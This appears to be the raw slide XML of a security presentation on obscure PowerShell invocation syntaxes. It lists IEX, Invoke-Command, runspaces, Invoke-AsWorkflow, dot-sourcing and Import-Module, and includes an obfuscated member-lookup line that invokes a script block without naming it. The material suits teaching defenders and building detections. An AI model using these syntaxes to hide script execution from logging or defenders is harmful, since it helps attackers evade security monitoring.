            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Concatenated IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1"/>
              <a:t>AsWorkflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Dot-Source</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (Disk-based)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Import-Module/IPMO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (Disk-based)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Up Arrow 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="4732735" y="3474814"/>
            <a:ext cx="254962" cy="727269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Up Arrow 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16902460">
            <a:off x="4178588" y="3455802"/>
            <a:ext cx="243885" cy="1973394"/>
          </a:xfrm>
          <a:prstGeom prst="upArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 57592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5129816" y="1461836"/>
            <a:ext cx="5698130" cy="2862322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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rgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Command</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ScriptBlock</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>]::Create(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$Script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ScriptBlock</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>]::Create(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$Script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.Invoke()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>GV *cut*t -Value).(((GV *cut*t -Value)|Member)[6].Name).(((GV *cut*t -Value).(((GV *cut*t -Value)|Member)[6].Name)|</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Member|Where-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>{(Get-Variable _ -Value).Name-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>clike'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*S*B*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>'}).Name)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.Invoke</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$Script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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129815" y="4476365"/>
            <a:ext cx="5698131" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[PowerShell]::Create().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AddScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$Script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke()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7629321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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Expression/IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Alias/GAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Command/GCM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS1.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>InvokeScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS1.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Command/ICM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>PS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Runspace</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Concatenated IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1"/>
              <a:t>AsWorkflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Dot-Source</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (Disk-based)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Import-Module/IPMO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (Disk-based)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Up Arrow 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5172087" y="3171266"/>
            <a:ext cx="254448" cy="2782406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6613382" y="5775364"/>
            <a:ext cx="46082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http://i0.kym-cdn.com/photos/images/newsfeed/000/995/349/9c9.jpg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6274" y="1315191"/>
            <a:ext cx="4493118" cy="4493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30410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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Expression/IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Alias/GAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Command/GCM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS1.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>InvokeScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS1.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Command/ICM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>PS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Runspace</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Concatenated IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AsWorkflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dot-Source</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (Disk-based)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200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Import-Module/IPMO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (Disk-based)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Up Arrow 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="6086047" y="5361880"/>
            <a:ext cx="256125" cy="636732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6613382" y="5775364"/>
            <a:ext cx="46082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http://i0.kym-cdn.com/photos/images/newsfeed/000/995/349/9c9.jpg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6274" y="1315191"/>
            <a:ext cx="4493118" cy="449311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331866" y="5103508"/>
            <a:ext cx="3890150" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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</a:rPr>
              <a:t>Import-Module</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>./</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>path_on_disk.ps1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IPMO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>./</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>path_on_disk.ps1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Up Arrow 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="14030899">
            <a:off x="5392586" y="4127223"/>
            <a:ext cx="256575" cy="944904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Up Arrow 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="15348441">
            <a:off x="5298267" y="4282532"/>
            <a:ext cx="264518" cy="1660061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5855646" y="4134815"/>
            <a:ext cx="4312949" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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</a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AsWorkflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>-Expression </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Script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0" y="4621751"/>
            <a:ext cx="2313643" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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rgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>./path_on_disk.ps1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="466073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800" dirty="0" smtClean="0"/>
